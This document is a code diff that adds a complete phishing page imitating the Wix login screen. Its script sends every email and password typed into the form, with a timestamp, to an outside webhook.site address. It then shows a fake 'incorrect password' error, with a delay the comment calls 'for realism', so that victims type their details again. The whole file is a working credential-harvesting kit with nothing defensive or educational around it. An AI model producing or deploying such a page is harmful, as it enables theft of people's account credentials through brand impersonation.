@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In | Wix</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #ffffff;
+            color: #000;
+        }
+
+        header {
+            width: 100%;
+            padding: 30px 60px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            font-weight: bold;
+            font-size: 28px;
+            letter-spacing: 1px;
+        }
+
+        .login-card {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            margin-top: 20px;
+            padding: 0 20px;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .signup-text {
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .signup-text a {
+            color: #0078ff;
+            text-decoration: none;
+        }
+
+        #error-msg {
+            display: none;
+            color: #d93025;
+            background-color: #fce8e6;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            border: 1px solid #f5c2c7;
+            text-align: left;
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #757575;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #d0d1d2;
+            padding: 10px 0;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-bottom: 2px solid #0078ff;
+        }
+
+        .continue-btn {
+            width: 100%;
+            background: white;
+            border: 1px solid #d0d1d2;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 16px;
+            color: #0078ff;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .continue-btn:hover {
+            border-color: #0078ff;
+            background-color: #f0f7ff;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #0078ff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .or-divider {
+            margin: 25px 0;
+            font-size: 14px;
+            color: #757575;
+        }
+
+        .social-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            border-radius: 50px;
+            font-weight: 500;
+            font-size: 15px;
+            cursor: pointer;
+            border: 1px solid #d0d1d2;
+            transition: 0.2s;
+        }
+
+        .social-btn img {
+            width: 18px;
+            height: 18px;
+            margin-right: 12px;
+        }
+
+        .google { background-color: white; color: #444; }
+        .facebook { background-color: #1877F2; color: white; border: none; }
+        .apple { background-color: black; color: white; border: none; }
+
+        footer {
+            margin-top: 60px;
+            padding: 20px;
+            font-size: 12px;
+            color: #757575;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">WIX</div>
+    </header>
+
+    <div class="login-card">
+        <h1>Log In</h1>
+        <div class="signup-text">
+            Don't have an account? <a href="#">Sign Up</a>
+        </div>
+
+        <div id="error-msg">The email or password you entered is incorrect. Please try again.</div>
+
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="email" required>
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" required>
+        </div>
+
+        <button type="button" class="continue-btn" id="submitBtn" onclick="sendData()">
+            <div class="spinner" id="btnSpinner"></div>
+            <span id="btnText">Continue with Email</span>
+        </button>
+
+        <div class="or-divider">or</div>
+
+        <div class="social-container">
+            <div class="social-btn google">
+                <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="Google">
+                Continue with Google
+            </div>
+            <div class="social-btn facebook">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook">
+                Continue with Facebook
+            </div>
+            <div class="social-btn apple">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" style="filter: invert(1);">
+                Continue with Apple
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        Terms of Use | Privacy Policy
+    </footer>
+
+    <script>
+        async function sendData() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('btnSpinner');
+            const errorBox = document.getElementById('error-msg');
+
+            if (!email || !password) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Start Loading State
+            btnText.innerText = "Connecting...";
+            spinner.style.display = "block";
+            btn.disabled = true;
+
+            try {
+                await fetch('https://webhook.site/geeky', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toLocaleString()
+                    })
+                });
+
+                // Short delay for realism
+                setTimeout(() => {
+                    btnText.innerText = "Continue with Email";
+                    spinner.style.display = "none";
+                    btn.disabled = false;
+                    
+                    errorBox.style.display = "block";
+                    document.getElementById('password').value = "";
+                    document.getElementById('password').focus();
+                }, 1800);
+
+            } catch (err) {
+                btnText.innerText = "Continue with Email";
+                spinner.style.display = "none";
+                btn.disabled = false;
+                errorBox.style.display = "block";
+            }
+        }
+    </script>
+</body>
+</html>
